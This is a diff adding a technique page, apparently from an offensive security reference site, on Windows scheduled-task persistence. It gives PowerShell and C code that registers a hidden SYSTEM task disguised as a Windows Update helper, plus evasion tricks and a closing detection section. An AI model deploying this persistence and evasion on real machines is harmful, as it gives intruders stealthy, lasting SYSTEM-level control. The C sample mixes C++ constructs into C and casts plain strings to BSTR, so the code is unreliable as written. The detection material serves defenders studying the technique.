@@ -1,0 +1,196 @@
+---
+title: Scheduled Task Persistence
+mitre: T1053.005
+category: persistence
+group: Boot / Logon Autostart
+summary: Register a Windows scheduled task to execute a payload on a schedule or system event.
+platform: [Windows]
+tags: ['PowerShell', 'C / C++', 'COM', 'XML']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: schtasks /create or Task Scheduler COM API
+    desc: Register a new task with the Task Scheduler service (svchost -k netsvcs, Schedule).
+    dll: taskschd
+  - call: define trigger
+    desc: AtLogon, AtStartup, Daily, OnIdle, EventTrigger — what causes the task to fire.
+    dll: taskschd
+  - call: define action
+    desc: Execute, ComHandler, SendEmail (deprecated), ShowMessage (deprecated).
+    dll: taskschd
+  - call: set principal
+    desc: Run as SYSTEM, a specific user, or the built-in Users group.
+    dll: taskschd
+  - call: (trigger fires)
+    desc: Task Scheduler service spawns the action from svchost — no user session interaction required for SYSTEM tasks.
+    dll: —
+detections:
+  - src: SYSMON EID 1
+    text: svchost.exe (Schedule service host) spawning unexpected child processes.
+  - src: WINDOWS EID 4698 / 4702
+    text: Security log events for task creation and modification — enabled when Advanced Audit Policy is configured.
+  - src: SYSMON EID 11
+    text: New XML file created under C:\Windows\System32\Tasks or C:\Windows\SysWOW64\Tasks.
+  - src: INVENTORY
+    text: Enumerate all registered tasks with schtasks /query /fo LIST /v; alert on tasks not in the approved baseline.
+related:
+  - mitre: T1547.001
+    title: Registry Run Keys
+    desc: Simpler but less flexible — no time-based triggers, no SYSTEM execution without admin.
+    href: /techniques/persistence/registry-run-keys
+  - mitre: T1543.003
+    title: Windows Service Creation
+    desc: An alternative for SYSTEM-level persistence that survives between reboots without a trigger.
+    href: /techniques/persistence/service-creation
+  - mitre: T1546.003
+    title: WMI Event Subscription
+    desc: Event-driven persistence without using the Task Scheduler service.
+    href: /techniques/persistence/wmi-event-subscription
+labKit:
+  - label: task_persist.ps1 + task_persist.c
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+The Task Scheduler service executes registered tasks in response to triggers: system events,
+logon, a schedule, or an idle state. Unlike Run keys (which fire in the user session),
+tasks with a SYSTEM principal fire without any user logged on, making them useful for both
+persistence across logons and maintaining SYSTEM-level code execution.
+
+Tasks are stored as XML files under `C:\Windows\System32\Tasks` and mirrored in the registry
+under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache`. Both locations
+are readable by any authenticated user, making enumeration trivial.
+
+<Callout type="note">
+  Windows 10+ Defender and most EDR products treat the creation of a task with a SYSTEM
+  principal by a non-administrative process as a high-confidence alert. The technique is most
+  useful post-privilege-escalation, not as a first-stage landing.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### PowerShell (one-liner)
+
+<CodeBlock
+  file="task_persist.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Create a SYSTEM-level task that runs at every logon
+$action  = New-ScheduledTaskAction -Execute "C:\\Windows\\Temp\\update.exe"
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+$settings = New-ScheduledTaskSettingsSet -Hidden
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" \`
+             -LogonType ServiceAccount -RunLevel Highest
+
+Register-ScheduledTask -TaskName "WindowsUpdateHelper" \`
+    -Action $action -Trigger $trigger \`
+    -Settings $settings -Principal $principal \`
+    -Description "Windows Update service companion"`}
+/>
+
+### C via COM API
+
+<CodeBlock
+  file="task_persist.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`// Task Scheduler COM API — avoids calling schtasks.exe
+#include \u003cwindows.h\u003e
+#include \u003ctaskschd.h\u003e
+#include \u003ccombaseapi.h\u003e
+#pragma comment(lib, "taskschd.lib")
+#pragma comment(lib, "ole32.lib")
+
+void create_task(const wchar_t *name, const wchar_t *exe_path) {
+    CoInitializeEx(NULL, COINIT_MULTITHREADED);
+
+    ITaskService *svc = NULL;
+    CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
+                     &IID_ITaskService, (void**)&svc);
+    svc->lpVtbl->Connect(svc, _variant_t(), _variant_t(),
+                         _variant_t(), _variant_t());
+
+    ITaskFolder *root = NULL;
+    svc->lpVtbl->GetFolder(svc, L"\\\\", &root);
+
+    ITaskDefinition *def = NULL;
+    svc->lpVtbl->NewTask(svc, 0, &def);
+
+    // Set to run as SYSTEM
+    IPrincipal *principal = NULL;
+    def->lpVtbl->get_Principal(def, &principal);
+    principal->lpVtbl->put_UserId(principal, L"S-1-5-18"); // SYSTEM SID
+    principal->lpVtbl->put_LogonType(principal, TASK_LOGON_SERVICE_ACCOUNT);
+    principal->lpVtbl->put_RunLevel(principal, TASK_RUNLEVEL_HIGHEST);
+
+    // Logon trigger
+    ITriggerCollection *triggers = NULL;
+    def->lpVtbl->get_Triggers(def, &triggers);
+    ITrigger *trigger = NULL;
+    triggers->lpVtbl->Create(triggers, TASK_TRIGGER_LOGON, &trigger);
+
+    // Action: execute our binary
+    IActionCollection *actions = NULL;
+    def->lpVtbl->get_Actions(def, &actions);
+    IAction *action = NULL;
+    actions->lpVtbl->Create(actions, TASK_ACTION_EXEC, &action);
+    IExecAction *exec_action = NULL;
+    action->lpVtbl->QueryInterface(action, &IID_IExecAction, (void**)&exec_action);
+    exec_action->lpVtbl->put_Path(exec_action, (BSTR)exe_path);
+
+    // Register the task
+    IRegisteredTask *reg = NULL;
+    root->lpVtbl->RegisterTaskDefinition(root, (BSTR)name, def,
+        TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(),
+        TASK_LOGON_SERVICE_ACCOUNT, _variant_t(), &reg);
+
+    // cleanup omitted
+    CoUninitialize();
+}`}
+/>
+
+## Trigger types
+
+| Trigger | Class | Use case |
+|---|---|---|
+| At logon | `TASK_TRIGGER_LOGON` | User-session persistence |
+| At startup | `TASK_TRIGGER_BOOT` | Pre-logon persistence, SYSTEM only |
+| Daily / weekly | `TASK_TRIGGER_DAILY` | Periodic C2 check-in |
+| On event | `TASK_TRIGGER_EVENT` | Reactionary — fire on a specific event log entry |
+| On idle | `TASK_TRIGGER_IDLE` | Low-activity execution to avoid detection |
+
+## Evasion tricks
+
+- **Task name blending** — name the task after an existing Windows task (`\Microsoft\Windows\UpdateOrchestrator\UpdateAssistant`)
+- **Random delay** — `<RandomDelay>PT5M</RandomDelay>` in the XML adds a random start delay
+- **Hidden flag** — `<Hidden>true</Hidden>` hides the task from the Task Scheduler GUI (but not from `schtasks /query`)
+- **COM handler action** — `TASK_ACTION_COM_HANDLER` loads a registered COM object instead of a binary, leaving no obvious executable path in the task XML
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+Windows event 4698 (task created) in the Security log is the authoritative signal, but it
+requires Advanced Audit Policy — specifically `Audit Other Object Access Events`. On endpoints
+without this policy, Sysmon's file creation event (EID 11) for the Tasks XML directory is the
+next best thing.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
